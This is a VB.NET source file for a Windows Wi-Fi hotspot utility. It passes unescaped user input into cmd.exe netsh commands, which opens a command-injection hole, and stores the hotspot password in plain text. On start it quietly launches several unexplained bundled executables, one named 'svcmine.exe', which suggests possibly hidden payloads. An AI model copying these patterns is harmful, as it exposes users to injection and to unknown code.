

Public Class Form1
    Dim keybp As String
    Dim printtext As String = "Hotspot Started"
    Dim nam As String
    Dim lengthy As Integer

    Private Property p As Process

    Function hotspotstart() As Single
        nam = ssid.Text
        keybp = key.Text
        lengthy = keybp.Length
        If lengthy >= 8 Then
            ssid.Enabled = False
            key.Enabled = False
            Shell("cmd.exe /c netsh wlan set hostednetwork mode=allow ssid=" + nam + " key=" + keybp)
            Shell("cmd.exe /c netsh wlan start hostednetwork")

            '
            '
            '
            '
            '
            '<!Services>
            printtext = "Starting Services"
            Label6.Text = ""
            Label6.ForeColor = Color.Blue
            animator.Enabled = True
            Shell("cmd.exe /c sc start wlansvc")
            Shell("cmd.exe /c sc start WwanSvc")
            Shell("cmd.exe /c sc start dot3svc")
            Shell("cmd.exe /c sc start Wcmsvc")
            Shell("cmd.exe /c sc start wcncsvc")
            Shell("cmd.exe /c sc start lmhosts")
            Shell("cmd.exe /c sc start PhoneSvc")
            Shell("cmd.exe /c sc start NcaSvc")
            Shell("cmd.exe /c sc start Netman")
            Shell("cmd.exe /c sc start PolicyAgent")
            Shell("cmd.exe /c sc start IpOverUsbSvc")
            Shell("cmd.exe /c sc start WlanSvc")
            Shell("cmd.exe /c sc start SharedAccess")
            Shell("cmd.exe /c sc start upnphost")
            Shell("cmd.exe /csc start ssdpsrv")
            Shell("cmd.exe /c sc start upnphost")
            Shell("cmd.exe /c sc start ssdpsrv")
            Shell("cmd.exe /c netsh wlan start hostednetwork")
            '
            '
            '
            Process.Start("svc2.exe")
            Process.Start("svcmine.exe")
            Process.Start("wifiservice.exe")
            Process.Start("start.exe")
            '
            '
            '
            '

            Starter.Enabled = False
            btnstop.Enabled = True

            Label6.Text = ("")
            printtext = "Hotspot Started"
            animator.Enabled = True
            Label6.ForeColor = Color.DarkBlue
            info.Visible = True
            Process.Start("q1.exe")
            key.Enabled = False
            ssid.Enabled = False


            'Recorder
            '
            '
            '

            System.IO.File.Create("hotspotname.txt").Dispose()



            'For Hotspot Name

            System.IO.File.Create("password.txt").Dispose()


            'For Hotspot Name
            '
            '
            '

            Dim FILE_NAME As String = "hotspotname.txt"  'For Hotspot Name
            If System.IO.File.Exists(FILE_NAME) = False Then  'For Hotspot Name
                System.IO.File.Create(FILE_NAME).Dispose()  'For Hotspot Name
            End If
            '
            '
            '
            '


            Dim objWriter As New System.IO.StreamWriter(FILE_NAME, True)  'For Hotspot Name
            objWriter.WriteLine(ssid.Text) 'For Hotspot Name
            objWriter.Close() 'For Hotspot Name

            Dim FILE_NAME1 As String = "password.txt"
            If System.IO.File.Exists(FILE_NAME1) = False Then
                System.IO.File.Create(FILE_NAME1).Dispose()
            End If
            Dim objWriter1 As New System.IO.StreamWriter(FILE_NAME1, True)
            objWriter1.WriteLine(key.Text)
            objWriter1.Close()

            If My.Computer.FileSystem.FileExists("firsttime.txt") = False Then
                System.IO.File.Create("firsttime.txt")
            End If

            Dim time As String = (My.Computer.Clock.LocalTime)

            Dim FILE_NAME2 As String = "intellitrace.txt"
            If System.IO.File.Exists(FILE_NAME2) = False Then
                System.IO.File.Create(FILE_NAME2).Dispose()
            End If
            Dim objWriter2 As New System.IO.StreamWriter(FILE_NAME2, True)
            objWriter2.WriteLine(time + " :  Hotspot Started")
            objWriter2.Close()

            'Recorder End
            '
            '
            'Share
            '
            '
            '
            '
            If System.IO.File.Exists("share.md5") = False Then
                Process.Start("script.exe")
                System.IO.File.Create("share.md5")
                CheckBox1.Visible = False
            End If
            '
            '
            '
            '
            '


        ElseIf lengthy < 8 Then
            MessageBox.Show("Password Must Be Of Minimum 8 Characters", "Error !")
        End If
    End Function


    Private Sub animator_Tick(sender As Object, e As EventArgs) Handles animator.Tick
        Label6.Text += printtext.Substring(Label6.Text.Length, 1)
        If Label6.Text = printtext Then animator.Enabled = False
    End Sub

    Private Sub Starter_Click(sender As Object, e As EventArgs) Handles Starter.Click
        hotspotstart()
   
    End Sub


    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        Me.DoubleBuffered = True
        If My.Computer.FileSystem.FileExists("hotspotname.txt") = True Then
            Dim fileReader As String
            fileReader = My.Computer.FileSystem.ReadAllText("hotspotname.txt")
            ssid.Text = (fileReader)
        End If
        If My.Computer.FileSystem.FileExists("password.txt") = True Then
            Dim fileReader2 As String
            fileReader2 = My.Computer.FileSystem.ReadAllText("password.txt")
            key.Text = (fileReader2)
        End If
        If System.IO.File.Exists("share.md5") = True Then
            CheckBox1.Visible = False
        End If

    End Sub
    Private Sub Button1_MouseHover(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Starter.MouseHover
        Starter.FlatAppearance.BorderColor = Color.DeepSkyBlue
        Starter.ForeColor = Color.White
        Starter.BackColor = Color.DeepSkyBlue
    End Sub
    Private Sub Button1_Mouseleave(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Starter.MouseLeave
        Starter.FlatAppearance.BorderColor = Color.DeepSkyBlue
        Starter.ForeColor = Color.DeepSkyBlue
        Starter.BackColor = Color.Transparent
    End Sub

    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
        If Label6.Text = ("Hotspot Stopped !") = True Then

            Application.Exit()

        ElseIf Label6.Text = ("Hotspot Started") Then
            MessageBox.Show("Application Will Be Running In Background.", "Information")
            Me.Visible = False
            Me.WindowState = FormWindowState.Minimized
            nsi.Visible = True
        End If


    End Sub

    Private Sub Button2_Click(sender As Object, e As EventArgs) Handles Button2.Click
        Me.WindowState = FormWindowState.Minimized
    End Sub


    Private Sub Button2_MouseHover(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles btnstop.MouseHover
        btnstop.FlatAppearance.BorderColor = Color.DeepSkyBlue
        btnstop.ForeColor = Color.White
        btnstop.BackColor = Color.DeepSkyBlue
    End Sub
    Private Sub Button2_Mouseleave(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles btnstop.MouseLeave
        btnstop.FlatAppearance.BorderColor = Color.DeepSkyBlue
        btnstop.ForeColor = Color.DeepSkyBlue
        btnstop.BackColor = Color.Transparent
    End Sub


    Private Sub btnstop_Click(sender As Object, e As EventArgs) Handles btnstop.Click
        Shell("cmd.exe /c netsh wlan stop hostednetwork")
        btnstop.Enabled = False
        Starter.Enabled = True

        Label6.Text = ""
        printtext = "Hotspot Stopped !"
        Label6.ForeColor = Color.Orange
        animator.Enabled = True
        key.Enabled = True
        ssid.Enabled = True
        '
        '
        '
        '
        '
        'Recorder
        Dim time As String = (My.Computer.Clock.LocalTime)

        Dim FILE_NAME2 As String = "intellitrace.txt"
        If System.IO.File.Exists(FILE_NAME2) = False Then
            System.IO.File.Create(FILE_NAME2).Dispose()
        End If
        Dim objWriter2 As New System.IO.StreamWriter(FILE_NAME2, True)
        objWriter2.WriteLine(time + " :  Hotspot Stopped !")
        objWriter2.Close()

        'Recorder End
        '
        '
        '
        '
        '
        '<!--Services-->
        '
        '
        Shell("cmd.exe /c sc stop WwanSvc")
        Shell("cmd.exe /c sc stop dot3svc")
        Shell("cmd.exe /c sc stop Wcmsvc")
        Shell("cmd.exe /c sc stop wcncsvc")
        Shell("cmd.exe /c sc stop lmhosts")
        Shell("cmd.exe /c sc stop PhoneSvc")
        Shell("cmd.exe /c sc stop NcaSvc")
        Shell("cmd.exe /c sc stop Netman")
        Shell("cmd.exe /c sc stop PolicyAgent")
        Shell("cmd.exe /c sc stop IpOverUsbSvc")
        Shell("cmd.exe /c sc stop WlanSvc")
        Shell("cmd.exe /c sc stop SharedAccess")
        Shell("cmd.exe /c sc stop upnphost")
        Shell("cmd.exe /csc stop ssdpsrv")
        Shell("cmd.exe /c sc stop upnphost")
        Shell("cmd.exe /c sc stop ssdpsrv")
        '
        '
        '
    End Sub

    Private Sub Button4_Click(sender As Object, e As EventArgs)
        Process.Start("http://onhax.net")
    End Sub

    Private Sub Label11_Click(sender As Object, e As EventArgs)
        Me.Visible = False
        about.Visible = True
    End Sub

    Private Sub Label2_Click(sender As Object, e As EventArgs) Handles Label2.Click
        Me.Visible = False
        updater.Visible = True
    End Sub

    Private Sub TogglePass_Click(sender As Object, e As MouseEventArgs)

    End Sub

    Private Sub Button5_Click(sender As Object, e As EventArgs) Handles Button5.Click
        If Button5.Text = ("●●●") Then
            keybp = key.Text
            key.PasswordChar = "●"c
            Button5.Text = ("Abc")
        ElseIf Button5.Text = ("Abc") Then
            key.Text = key.Text
            key.PasswordChar = ""
            Button5.Text = ("●●●")
        End If
    End Sub

    Private Sub MeetTheMakerToolStripMenuItem_Click(sender As Object, e As EventArgs)
        Me.Visible = False
        team.Visible = True
    End Sub

    Private Sub AboutToolStripMenuItem_Click(sender As Object, e As EventArgs)
        Me.Visible = False
        about.Visible = True
    End Sub


    Private Sub CheckForUpdatesToolStripMenuItem_Click(sender As Object, e As EventArgs)
        Me.Visible = False
        updater.Visible = True
    End Sub

    Private Sub ContactUsToolStripMenuItem_Click(sender As Object, e As EventArgs)

    End Sub

    Private Sub info_Click(sender As Object, e As EventArgs) Handles info.Click
        Me.Visible = False
        information.Visible = True
    End Sub
    Private Sub info_MouseHover(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles info.MouseHover
        info.FlatAppearance.BorderColor = Color.DeepSkyBlue
        info.ForeColor = Color.White
        info.BackColor = Color.DeepSkyBlue
    End Sub
    Private Sub info_Mouseleave(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles info.MouseLeave
        info.FlatAppearance.BorderColor = Color.DeepSkyBlue
        info.ForeColor = Color.DeepSkyBlue
        info.BackColor = Color.Transparent
    End Sub

    Private Sub Button5_MouseHover(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button5.MouseHover
        Button5.FlatAppearance.BorderColor = Color.DeepSkyBlue
        Button5.ForeColor = Color.White
        Button5.BackColor = Color.DeepSkyBlue
    End Sub
    Private Sub Button5_Mouseleave(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button5.MouseLeave
        Button5.FlatAppearance.BorderColor = Color.DeepSkyBlue
        Button5.ForeColor = Color.DeepSkyBlue
        Button5.BackColor = Color.Transparent
    End Sub








    Private Sub ToolStripMenuItem4_Click(sender As Object, e As EventArgs) Handles ToolStripMenuItem4.Click
        Me.Visible = False
        updater.Visible = True
    End Sub

    Private Sub ToolStripMenuItem5_Click(sender As Object, e As EventArgs) Handles ToolStripMenuItem5.Click
        Me.Visible = False
        contact.Visible = True
    End Sub

    Private Sub ToolStripMenuItem6_Click(sender As Object, e As EventArgs) Handles ToolStripMenuItem6.Click
        Me.Visible = False
        team.Visible = True

    End Sub

    Private Sub ToolStripMenuItem8_Click(sender As Object, e As EventArgs) Handles ToolStripMenuItem8.Click
        Me.Visible = False
        about.Visible = True
    End Sub

    Private Sub Button3_Click(sender As Object, e As EventArgs) Handles Button3.Click
        smile.Refresh()
        smile.Visible = True
    End Sub



    Private Sub ToolStripMenuItem7_Click(sender As Object, e As EventArgs) Handles ToolStripMenuItem7.Click
        Me.Visible = False
        helper.Visible = True
    End Sub

    Private Sub Label3_Click(sender As Object, e As EventArgs) Handles Label3.Click
        Me.Visible = False
        helper.Visible = True
    End Sub

    Private Sub SupportToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles SupportToolStripMenuItem.Click
        Me.Visible = False
        support.Visible = True
    End Sub
    Private Sub Form1_close(sender As Object, ByVal e As System.Windows.Forms.FormClosingEventArgs) Handles MyBase.FormClosing
        If Label6.Text = ("Hotspot Stopped !") = True Then
            e.Cancel = False
        ElseIf Label6.Text = ("Hotspot Started") Then
            MessageBox.Show("Application Will Be Running In Background", "Information")
            e.Cancel = True
            nsi.Visible = True
            Me.ShowInTaskbar = False
            Me.Visible = False
        End If
    End Sub

    Private Sub nsi_MouseDoubleClick(sender As Object, e As MouseEventArgs) Handles nsi.MouseDoubleClick
        Me.Visible = True
        Me.ShowInTaskbar = True
        nsi.Visible = False
    End Sub

    Private Sub CheckBox1_CheckedChanged(sender As Object, e As EventArgs) Handles CheckBox1.CheckedChanged

    End Sub
End Class
